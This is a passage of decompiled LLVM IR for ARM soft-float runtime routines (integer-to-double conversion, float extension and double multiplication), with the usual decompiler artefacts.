define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_30354 = icmp eq i32 %arg1, 0
  br i1 %v2_30354, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_3035c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_30354, i32 %v0_3035c)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_30374 = call i32 @function_30194()
  ret i32 %v0_30374

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_30378 = icmp eq i32 %arg1, 0
  br i1 %v2_30378, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_30380 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_30378, i32 %v0_30380)
  store i32 1074, i32* @r4, align 4
  %v1_30390 = and i32 %arg1, -2147483648
  store i32 %v1_30390, i32* @r5, align 4
  %v2_30390 = icmp eq i32 %v1_30390, 0
  br i1 %v2_30390, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_30394 = sub i32 0, %arg1
  store i32 %v2_30394, i32* @r0, align 4
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  store i32 0, i32* @r1, align 4
  %v0_3039c = call i32 @function_30194()
  ret i32 %v0_3039c

; uselistorder directives
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v2_303a0 = mul i32 %arg1, 2
  store i32 %v2_303a0, i32* %r2.global-to-local, align 4
  %v4_303a0 = icmp eq i32 %v2_303a0, 0
  %v1_303a4 = and i32 %v2_303a0, 4
  %v2_303a4 = icmp ne i32 %v1_303a4, 0
  %v3_303a4 = sdiv i32 %v2_303a0, 8
  %v3_303a8 = zext i1 %v2_303a4 to i32
  %v6_303a8 = zext i32 %v3_303a4 to i64
  %v7_303a8 = sub nsw i32 33, %v3_303a4
  %v8_303a8 = zext i32 %v7_303a8 to i64
  %v9_303a8 = shl i64 %v6_303a8, %v8_303a8
  %v10_303a8 = sub nsw i32 32, %v3_303a4
  %v11_303a8 = shl i32 %v3_303a8, %v10_303a8
  %v12_303a8 = zext i32 %v11_303a8 to i64
  %v14_303a8 = or i64 %v12_303a8, %v9_303a8
  %v15_303a8 = trunc i64 %v14_303a8 to i32
  store i32 %v15_303a8, i32* %r1.global-to-local, align 4
  %v3_303ac = mul i32 %arg1, 536870912
  store i32 %v3_303ac, i32* @r0, align 4
  br i1 %v4_303a0, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_303b0 = and i32 %v2_303a0, -16777216
  store i32 %v2_303b0, i32* @r3, align 4
  %v4_303b0 = icmp eq i32 %v2_303b0, 0
  br i1 %v4_303b0, label %.thread1, label %bb7

bb7:                                              ; preds = %bb
  %v4_303b4 = icmp ugt i32 %v2_303a0, -16777217
  br i1 %v4_303b4, label %.thread1, label %bb8

bb8:                                              ; preds = %bb7
  %v2_303b8 = xor i32 %v15_303a8, 939524096
  store i32 %v2_303b8, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb7, %bb8
  %v1_303bc = phi i1 [ false, %bb ], [ false, %bb7 ], [ true, %bb8 ], [ false, %entry ]
  %v0_303bc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_303bc, i32 %v0_303bc)
  %v0_303c0 = load i32, i32* %r2.global-to-local, align 4
  %v2_303c0 = icmp eq i32 %v0_303c0, 0
  br i1 %v2_303c0, label %bb10, label %bb9

bb9:                                              ; preds = %.thread1
  %v1_303c4 = load i32, i32* @r3, align 4
  %v4_303c4 = icmp eq i32 %v1_303c4, -16777216
  br label %bb10

bb10:                                             ; preds = %.thread1, %bb9
  %v1_303c8 = phi i1 [ true, %.thread1 ], [ %v4_303c4, %bb9 ]
  %v0_303c8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_303c8, i32 %v0_303c8)
  store i32 896, i32* @r4, align 4
  %v0_303d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_303d4 = and i32 %v0_303d4, -2147483648
  store i32 %v1_303d4, i32* @r5, align 4
  %tmp = bitcast i32 %v0_303d4 to float
  %tmp11 = call float @fabsf(float %tmp)
  %v1_303d8 = bitcast float %tmp11 to i32
  store i32 %v1_303d8, i32* @r1, align 4
  %v0_303dc = call i32 @function_30194()
  ret i32 %v0_303dc

; uselistorder directives
  uselistorder i32 %v3_303a4, { 1, 2, 0 }
  uselistorder i32 %v2_303a0, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_30194, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_303e0 = or i32 %arg2, %arg1
  %v4_303e0 = icmp eq i32 %v2_303e0, 0
  %v0_303e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_303e0, i32 %v0_303e4)
  store i32 0, i32* @r5, align 4
  %v0_303f0 = call i32 @function_30410()
  ret i32 %v0_303f0
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_303f4 = or i32 %arg2, %arg1
  %v4_303f4 = icmp eq i32 %v2_303f4, 0
  %v0_303f8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_303f4, i32 %v0_303f8)
  %v1_30404 = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_30404, i32 ptrtoint (i32* @global_var_30410.3618 to i32))
  %v1_30408 = sub i32 0, %arg1
  ret i32 %v1_30408

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_30410() local_unnamed_addr {
dec_label_pc_30410:
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_30418 = load i32, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_30418, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_30134.3616 to i32))
  %tmp6 = icmp ult i32 %v0_30418, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_30410
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_30410, %bb
  %v1_30430 = phi i32 [ 3, %dec_label_pc_30410 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_30418, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_30430 = add nuw nsw i32 %v1_30430, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_30434 = phi i32 [ %v1_30430, %bb3 ], [ %v2_30430, %bb4 ]
  %not. = icmp slt i32 %v0_30418, 0
  %v4_30434 = zext i1 %not. to i32
  %v5_30434 = add nsw i32 %v0_30434, %v4_30434
  %v1_30438 = sub nsw i32 32, %v5_30434
  %v0_3043c = load i32, i32* @r0, align 4
  %v6_3043c = shl i32 %v0_3043c, %v1_30438
  store i32 %v6_3043c, i32* @ip, align 4
  %v6_30440 = lshr i32 %v0_3043c, %v5_30434
  %v1_30444 = load i32, i32* @r1, align 4
  %v7_30444 = shl i32 %v1_30444, %v1_30438
  %v8_30444 = or i32 %v7_30444, %v6_30440
  %v6_30448 = lshr i32 %v1_30444, %v5_30434
  %v0_3044c = load i32, i32* %r4.global-to-local, align 4
  %v2_3044c = add i32 %v0_3044c, %v5_30434
  store i32 %v2_3044c, i32* @r4, align 4
  %v4_30450 = sext i32 %v8_30444 to i64
  %v5_30450 = call i32 @function_30134(i64 %v4_30450, i32 %v6_30448, i32 %v5_30434, i32 %v1_30438)
  ret i32 %v5_30450

; uselistorder directives
  uselistorder i32 %v5_30434, { 2, 0, 1, 3, 4 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_30454 = load i32, i32* @r4, align 4
  store i32 %v3_30454, i32* %stack_var_-16, align 4
  %v12_30454 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_30460 = udiv i32 %arg2, 1048576
  %v5_30460 = urem i32 %v4_30460, 2048
  store i32 %v5_30460, i32* %r4.global-to-local, align 4
  %v6_30460 = icmp eq i32 %v5_30460, 0
  br i1 %v6_30460, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v5_30464 = udiv i32 %arg4, 1048576
  %v6_30464 = urem i32 %v5_30464, 2048
  store i32 %v6_30464, i32* @r5, align 4
  %v7_30464 = icmp eq i32 %v6_30464, 0
  br i1 %v7_30464, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_30468 = icmp eq i32 %v5_30460, 2047
  br i1 %v5_30468, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_3046c = icmp eq i32 %v6_30464, 2047
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb, %bb38, %bb39
  %v0_30470 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_3046c, %bb39 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_30474.3621 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_30470, i32 ptrtoint (i32* @global_var_3064c.3619 to i32))
  %v0_30474 = load i32, i32* %r4.global-to-local, align 4
  %v1_30474 = load i32, i32* @r5, align 4
  %v2_30474 = add i32 %v1_30474, %v0_30474
  store i32 %v2_30474, i32* %r4.global-to-local, align 4
  %v2_30478 = xor i32 %arg4, %arg2
  %v1_3047c = load i32, i32* %ip.global-to-local, align 4
  %tmp51 = mul i32 %v1_3047c, -2097152
  %v5_3047c = add i32 %tmp51, -1
  %v6_3047c = and i32 %v5_3047c, %arg2
  store i32 %v6_3047c, i32* %r1.global-to-local, align 4
  %v6_30480 = and i32 %v5_3047c, %arg4
  %v5_30484 = mul i32 %arg2, 4096
  %v6_30484 = or i32 %v5_30484, %tmp32
  %v8_30484 = icmp eq i32 %v6_30484, 0
  br i1 %v8_30484, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_3048c5 = or i32 %v6_3047c, 1048576
  store i32 %v1_3048c5, i32* %r1.global-to-local, align 4
  %v1_304907 = or i32 %v6_30480, 1048576
  br label %dec_label_pc_30510

bb40:                                             ; preds = %.thread2
  %v6_30488 = mul i32 %arg4, 4096
  %v7_30488 = or i32 %v6_30488, %arg3
  %v9_30488 = icmp eq i32 %v7_30488, 0
  %v1_3048c = or i32 %v6_3047c, 1048576
  store i32 %v1_3048c, i32* %r1.global-to-local, align 4
  %v1_30490 = or i32 %v6_30480, 1048576
  br i1 %v9_30488, label %dec_label_pc_30510, label %dec_label_pc_30498

dec_label_pc_30498:                               ; preds = %bb40
  %v6_30498 = mul nuw i64 %tmp, %arg1
  %v7_30498 = udiv i64 %v6_30498, 4294967296
  %v9_30498 = trunc i64 %v6_30498 to i32
  store i32 %v9_30498, i32* %ip.global-to-local, align 4
  %v7_304a0 = zext i32 %v1_3048c to i64
  %v11_304a0 = mul nuw nsw i64 %v7_304a0, %tmp
  %v12_304a0 = add i64 %v11_304a0, %v7_30498
  %v1_304a4 = and i32 %v2_30478, -2147483648
  %v10_304a8 = zext i32 %v1_30490 to i64
  %v11_304a8 = mul nuw i64 %v10_304a8, %arg1
  %v12_304a8 = add i64 %v12_304a0, %v11_304a8
  %v13_304a8 = udiv i64 %v12_304a8, 4294967296
  %v15_304a8 = trunc i64 %v12_304a8 to i32
  %v10_304b0 = mul nuw i64 %v10_304a8, %v7_304a0
  %v11_304b0 = add i64 %v13_304a8, %v10_304b0
  %v12_304b0 = udiv i64 %v11_304b0, 4294967296
  %v13_304b0 = trunc i64 %v12_304b0 to i32
  %v14_304b0 = trunc i64 %v11_304b0 to i32
  %v2_304b4 = icmp eq i32 %v9_30498, 0
  br i1 %v2_304b4, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_30498
  %v2_304b8 = or i32 %v15_304a8, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_30498, %bb41
  %storemerge = phi i32 [ %v2_304b8, %bb41 ], [ %v15_304a8, %dec_label_pc_30498 ]
  %v0_304cc = phi i32 [ %v2_304b8, %bb41 ], [ %v15_304a8, %dec_label_pc_30498 ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_304bc = add i32 %v2_30474, -255
  %v2_304c0 = icmp ugt i32 %v13_304b0, 511
  %v2_304c4 = icmp eq i1 %v2_304c0, false
  %v3_304c4 = add i32 %v2_30474, -1023
  %v5_304c4 = sext i1 %v2_304c4 to i32
  %v6_304c4 = add i32 %v3_304c4, %v5_304c4
  store i32 %v6_304c4, i32* %r4.global-to-local, align 4
  %v3_304c8 = icmp ugt i32 %v1_304bc, 768
  br i1 %v3_304c8, label %dec_label_pc_304d8, label %dec_label_pc_304cc

dec_label_pc_304cc:                               ; preds = %bb42
  %v1_304cc = icmp slt i32 %v0_304cc, 0
  %v2_304cc = mul i32 %v0_304cc, 2
  store i32 %v2_304cc, i32* %lr.global-to-local, align 4
  %v3_304d0 = mul i32 %v14_304b0, 2
  %v4_304d0 = zext i1 %v1_304cc to i32
  %v5_304d0 = or i32 %v4_304d0, %v3_304d0
  %v9_304d0 = icmp ule i32 %v5_304d0, %v14_304b0
  %v10_304d0 = icmp ult i32 %v3_304d0, %v14_304b0
  %v11_304d0 = select i1 %v1_304cc, i1 %v9_304d0, i1 %v10_304d0
  %v3_304d425 = mul nuw nsw i64 %v12_304b0, 2
  %v3_304d4 = trunc i64 %v3_304d425 to i32
  %v4_304d4 = zext i1 %v11_304d0 to i32
  %v5_304d4 = or i32 %v4_304d4, %v3_304d4
  br label %dec_label_pc_304d8

dec_label_pc_304d8:                               ; preds = %bb42, %dec_label_pc_304cc
  %v0_304e8 = phi i32 [ %v0_304cc, %bb42 ], [ %v2_304cc, %dec_label_pc_304cc ]
  %v0_304e0 = phi i32 [ %v14_304b0, %bb42 ], [ %v5_304d0, %dec_label_pc_304cc ]
  %v1_304d8 = phi i32 [ %v13_304b0, %bb42 ], [ %v5_304d4, %dec_label_pc_304cc ]
  %v4_304d8 = mul i32 %v1_304d8, 2048
  %v4_304dc = udiv i32 %v0_304e0, 2097152
  %v5_304d8 = or i32 %v4_304dc, %v1_304a4
  %v5_304dc = or i32 %v5_304d8, %v4_304d8
  store i32 %v5_304dc, i32* %r1.global-to-local, align 4
  %v3_304e0 = mul i32 %v0_304e0, 2048
  %v4_304e4 = udiv i32 %v0_304e8, 2097152
  %v5_304e4 = or i32 %v3_304e0, %v4_304e4
  store i32 %v5_304e4, i32* %r0.global-to-local, align 4
  %v3_304e8 = mul i32 %v0_304e8, 2048
  store i32 %v3_304e8, i32* %lr.global-to-local, align 4
  %v1_304ec = add i32 %v6_304c4, -253
  store i32 %v1_304ec, i32* %ip.global-to-local, align 4
  %v2_304ec = icmp ugt i32 %v6_304c4, 252
  %v7_304ec = icmp eq i32 %v6_304c4, 253
  %v2_304f0 = xor i1 %v7_304ec, true
  %v3_304f0 = and i1 %v2_304ec, %v2_304f0
  br i1 %v3_304f0, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_304d8
  %v6_304f0 = icmp ugt i32 %v1_304ec, 1791
  %v11_304f0 = icmp eq i32 %v1_304ec, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_304d8, %bb43
  %v1_304f4 = phi i1 [ %v7_304ec, %dec_label_pc_304d8 ], [ %v11_304f0, %bb43 ]
  %v0_304f4 = phi i1 [ %v2_304ec, %dec_label_pc_304d8 ], [ %v6_304f0, %bb43 ]
  %v2_304f4 = xor i1 %v1_304f4, true
  %v3_304f4 = and i1 %v0_304f4, %v2_304f4
  call void @__pseudo_cond_branch(i1 %v3_304f4, i32 ptrtoint (i32* @global_var_30540.3620 to i32))
  %v0_304f8 = load i32, i32* %lr.global-to-local, align 4
  %v2_304f8 = icmp slt i32 %v0_304f8, 0
  %v6_304f8 = icmp eq i32 %v0_304f8, -2147483648
  %v1_304fc = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_304f8, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_304fc = urem i32 %v1_304fc, 2
  %v3_304fc = icmp ne i32 %v2_304fc, 0
  %v4_304fc = udiv i32 %v1_304fc, 2
  store i32 %v4_304fc, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_30500 = phi i1 [ %v3_304fc, %bb45 ], [ %v2_304f8, %bb44 ]
  %v2_30500 = zext i1 %v1_30500 to i32
  %v3_30500 = add i32 %v2_30500, %v1_304fc
  store i32 %v3_30500, i32* %r0.global-to-local, align 4
  %v0_30504 = load i32, i32* %r1.global-to-local, align 4
  %v1_30504 = load i32, i32* %r4.global-to-local, align 4
  %v2_30504 = and i32 %v1_30504, 4096
  %v3_30504 = icmp ne i32 %v2_30504, 0
  %v4_30504 = mul i32 %v1_30504, 1048576
  %v6_30504 = add i32 %v4_30504, %v0_30504
  %v7_30504 = zext i1 %v3_30504 to i32
  %v8_30504 = add i32 %v7_30504, %v6_30504
  store i32 %v8_30504, i32* %r1.global-to-local, align 4
  %v2_30508 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_30508, i32* %r4.global-to-local, align 4
  store i32 %v12_30454, i32* %lr.global-to-local, align 4
  ret i32 %v3_30500

dec_label_pc_30510:                               ; preds = %.thread3, %bb40
  %v1_3051c = phi i32 [ %v1_304907, %.thread3 ], [ %v1_30490, %bb40 ]
  %v1_30514 = phi i32 [ %v1_3048c5, %.thread3 ], [ %v1_3048c, %bb40 ]
  %v1_30510 = and i32 %v2_30478, -2147483648
  %v2_30514 = or i32 %v1_30514, %v1_30510
  %v4_305181 = or i64 %tmp, %arg1
  %v4_30518 = trunc i64 %v4_305181 to i32
  store i32 %v4_30518, i32* %r0.global-to-local, align 4
  %v2_3051c = xor i32 %v2_30514, %v1_3051c
  store i32 %v2_3051c, i32* %r1.global-to-local, align 4
  %v4_30520 = udiv i32 %v1_3047c, 2
  %v5_30520 = sub i32 %v2_30474, %v4_30520
  store i32 %v5_30520, i32* %r4.global-to-local, align 4
  %v7_30520 = sub i32 0, %v5_30520
  %v8_30520 = and i32 %v2_30474, %v7_30520
  %v11_30520 = icmp eq i32 %v2_30474, %v4_30520
  %v7_30524 = icmp sgt i32 %v2_30474, %v4_30520
  br i1 %v7_30524, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_30510
  %v10_30524 = sub i32 %v1_3047c, %v5_30520
  %v12_30524 = xor i32 %v5_30520, %v1_3047c
  %v13_30524 = xor i32 %v10_30524, %v1_3047c
  %v14_30524 = and i32 %v13_30524, %v12_30524
  %v17_30524 = icmp eq i32 %v1_3047c, %v5_30520
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_30510, %bb46
  %v3_30530.in = phi i32 [ %v8_30520, %dec_label_pc_30510 ], [ %v14_30524, %bb46 ]
  %v2_30530.in = phi i32 [ %v5_30520, %dec_label_pc_30510 ], [ %v10_30524, %bb46 ]
  %v1_30530 = phi i1 [ %v11_30520, %dec_label_pc_30510 ], [ %v17_30524, %bb46 ]
  %v2_30530 = icmp slt i32 %v2_30530.in, 0
  %v3_30530 = icmp slt i32 %v3_30530.in, 0
  %v3_30528 = xor i1 %v3_30530, %v2_30530
  %v4_30528 = or i1 %v1_30530, %v3_30528
  br i1 %v4_30528, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_30530.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_3052830 = mul i32 %v5_30520, 1048576
  %v10_3052831 = or i32 %v2_3051c, %v9_3052830
  store i32 %v10_3052831, i32* %r1.global-to-local, align 4
  %v7_3052c = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_3052c, i32* %r4.global-to-local, align 4
  store i32 %v12_30454, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_30530 = phi i32 [ %v0_30530.pre, %._crit_edge23 ], [ %v12_30454, %bb48 ]
  %v6_30530 = xor i1 %v4_30528, true
  call void @__pseudo_cond_branch(i1 %v6_30530, i32 %v0_30530)
  %v0_30534 = load i32, i32* %r1.global-to-local, align 4
  %v1_30534 = or i32 %v0_30534, 1048576
  store i32 %v1_30534, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_3053c = load i32, i32* %r4.global-to-local, align 4
  %v1_3053c = add i32 %v0_3053c, -1
  store i32 %v1_3053c, i32* %r4.global-to-local, align 4
  ret i32 %v4_30518

; uselistorder directives
  uselistorder i32 %v5_30520, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_30520, { 2, 1, 0 }
  uselistorder i32 %v1_304fc, { 2, 0, 1 }
  uselistorder i32 %v0_304f8, { 1, 0 }
  uselistorder i1 %v7_304ec, { 1, 0 }
  uselistorder i32 %v2_304cc, { 1, 0 }
  uselistorder i1 %v1_304cc, { 1, 0 }
  uselistorder i32 %v6_304c4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_304cc, { 1, 0, 2 }
  uselistorder i32 %v14_304b0, { 1, 3, 2, 0 }
  uselistorder i64 %v11_304b0, { 1, 0 }
  uselistorder i64 %v12_304a8, { 1, 0 }
  uselistorder i64 %v10_304a8, { 1, 0 }
  uselistorder i64 %v7_304a0, { 1, 0 }
  uselistorder i64 %v6_30498, { 1, 0 }
  uselistorder i32 %v6_30480, { 1, 0 }
  uselistorder i32 %v6_3047c, { 1, 0, 2 }
  uselistorder i32 %v1_3047c, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_30474, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_30464, { 2, 1, 0 }
  uselistorder i32 %v5_30460, { 2, 1, 0 }
  uselistorder i32 %v12_30454, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 10, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i32 -255, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_30510, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_304d8, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_30540() local_unnamed_addr {
dec_label_pc_30540:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_30540 = load i1, i1* @cpsr_z, align 1
  %v1_30540 = load i1, i1* @cpsr_n, align 1
  %v2_30540 = load i1, i1* @cpsr_v, align 1
  %v3_30540 = xor i1 %v1_30540, %v2_30540
  %v4_30540 = or i1 %v0_30540, %v3_30540
  br i1 %v4_30540, label %dec_label_pc_30544, label %dec_label_pc_306bc

dec_label_pc_30544:                               ; preds = %dec_label_pc_30540
  %v0_30544 = load i32, i32* @r4, align 4
  %v4_30544 = add i32 %v0_30544, 54
  %v6_30544 = sub i32 0, %v0_30544
  %v7_30544 = and i32 %v4_30544, %v6_30544
  %v8_30544 = icmp slt i32 %v7_30544, 0
  %v9_30544 = icmp slt i32 %v4_30544, 0
  %v10_30544 = icmp eq i32 %v4_30544, 0
  %v7_30548 = icmp sgt i32 %v0_30544, -54
  br i1 %v7_30548, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_30544
  store i32 0, i32* @r0, align 4
  %v8_3054c = load i32, i32* @r1, align 4
  %v9_3054c = and i32 %v8_3054c, -2147483648
  store i32 %v9_3054c, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_30544, %bb
  %v4_30554 = xor i1 %v9_30544, %v8_30544
  %v5_30554 = or i1 %v10_30544, %v4_30554
  call void @__pseudo_cond_branch(i1 %v5_30554, i32 %tmp7)
  %v0_30558 = load i32, i32* @r4, align 4
  %v1_30558 = sub i32 0, %v0_30558
  %v2_3055c = sub i32 -32, %v0_30558
  %v4_3055c = add i32 %v0_30558, 31
  %v5_3055c = and i32 %v4_3055c, %v1_30558
  %v6_3055c = icmp slt i32 %v5_3055c, 0
  store i1 %v6_3055c, i1* @cpsr_v, align 1
  %v6_30560 = icmp slt i32 %v1_30558, 32
  br i1 %v6_30560, label %dec_label_pc_30564, label %dec_label_pc_305d0

dec_label_pc_30564:                               ; preds = %.thread1
  %v1_30564 = add i32 %v2_3055c, 12
  %v8_30568 = icmp sgt i32 %v1_30564, 0
  br i1 %v8_30568, label %dec_label_pc_305a0, label %dec_label_pc_3056c

dec_label_pc_3056c:                               ; preds = %dec_label_pc_30564
  %v1_3056c = add i32 %v2_3055c, 32
  %v1_30570 = sub i32 0, %v2_3055c
  %v0_30574 = load i32, i32* @r0, align 4
  %v6_30574 = shl i32 %v0_30574, %v1_30570
  %v2_30578 = add i32 %v2_3055c, 31
  %v3_30578 = shl i32 1, %v2_30578
  %v6_30578 = lshr i32 %v0_30574, %v1_3056c
  %v1_3057c = load i32, i32* @r1, align 4
  %v7_3057c = shl i32 %v1_3057c, %v1_30570
  %v8_3057c = or i32 %v7_3057c, %v6_30578
  %v1_30580 = and i32 %v1_3057c, -2147483648
  %tmp = bitcast i32 %v1_3057c to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_30584 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_30574, 0
  %v4_30588 = zext i1 %tmp20 to i32
  %v5_30588 = add i32 %v8_3057c, %v4_30588
  %v5_3058c = and i32 %v1_30584, %v3_30578
  %v6_3058c = icmp ne i32 %v5_3058c, 0
  %v7_3058c = lshr i32 %v1_30584, %v1_3056c
  %v9_3058c = add i32 %v7_3058c, %v1_30580
  %v10_3058c = zext i1 %v6_3058c to i32
  %v11_3058c = add i32 %v9_3058c, %v10_3058c
  store i32 %v11_3058c, i32* @r1, align 4
  %v19_3058c = add i32 %v11_3058c, %v10_3058c
  %v20_3058c = xor i32 %v19_3058c, %v1_3057c
  %v21_3058c = xor i32 %v19_3058c, %v7_3058c
  %v22_3058c = and i32 %v20_3058c, %v21_3058c
  %v23_3058c = icmp slt i32 %v22_3058c, 0
  store i1 %v23_3058c, i1* @cpsr_v, align 1
  %v3_30590 = mul i32 %v6_30574, 2
  %v4_30590 = or i32 %v3_30590, %tmp7
  %v5_30590 = icmp slt i32 %v4_30590, 0
  store i1 %v5_30590, i1* @cpsr_n, align 1
  %v6_30590 = icmp eq i32 %v4_30590, 0
  store i1 %v6_30590, i1* @cpsr_z, align 1
  br i1 %v6_30590, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_3056c
  %tmp21 = sext i1 %tmp20 to i32
  %v6_30594 = add nsw i32 %tmp21, -1
  %v7_30594 = and i32 %v5_30588, %v6_30594
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_3056c, %bb13
  %v1_3059c = phi i32 [ %v5_30588, %dec_label_pc_3056c ], [ %v7_30594, %bb13 ]
  %v2_30598 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_30598, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_3059c

dec_label_pc_305a0:                               ; preds = %dec_label_pc_30564
  %v1_305a0 = sub i32 0, %v2_3055c
  %v1_305a4 = add i32 %v2_3055c, 32
  %v0_305a8 = load i32, i32* @r0, align 4
  %v6_305a8 = shl i32 %v0_305a8, %v1_305a0
  %v6_305ac = lshr i32 %v0_305a8, %v1_305a4
  %v1_305b0 = load i32, i32* @r1, align 4
  %v7_305b0 = shl i32 %v1_305b0, %v1_305a0
  %v8_305b0 = or i32 %v7_305b0, %v6_305ac
  %v1_305b4 = and i32 %v1_305b0, -2147483648
